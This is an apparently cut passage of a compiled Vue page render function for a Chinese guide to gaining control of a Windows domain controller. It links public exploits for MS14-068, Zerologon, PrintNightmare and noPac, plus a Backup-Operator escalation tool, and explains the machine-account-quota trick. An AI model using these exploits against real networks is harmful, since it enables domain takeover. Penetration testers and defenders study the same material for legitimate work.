r(),d("div",null,[o,s("p",null,[e("下载EXP："),s("a",p,[e("https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068"),i(n)])]),m,s("p",null,[e("EXP下载："),s("a",u,[e("https://github.com/dirkjanm/CVE-2020-1472"),i(n)])]),v,s("p",null,[e("下载"),b,e("："),s("a",h,[e("https://github.com/risksense/zerologon"),i(n)])]),g,s("p",null,[e("下载EXP："),s("a",k,[e("https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1"),i(n)])]),C,s("p",null,[e("EXP下载："),s("a",_,[e("https://github.com/cube0x0/CVE-2021-1675"),i(n)])]),S,s("details",f,[x,y,A,s("p",null,[e("由于默认情况下 "),s("a",D,[e("MAQ"),i(n)]),e(" 特性，域内普通用户可以创建 10 个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。")]),w]),E,s("p",null,[e("工具地址："),s("a",N,[e("https://github.com/cube0x0/noPac"),i(n)])]),T,s("p",null,[s("a",P,[e("https://github.com/mpgn/BackupOperatorToDA"),i(n)])])])}const W=l(t,[["render",M],["__file","域控获取方式.html.vue"]]);export{W as default};
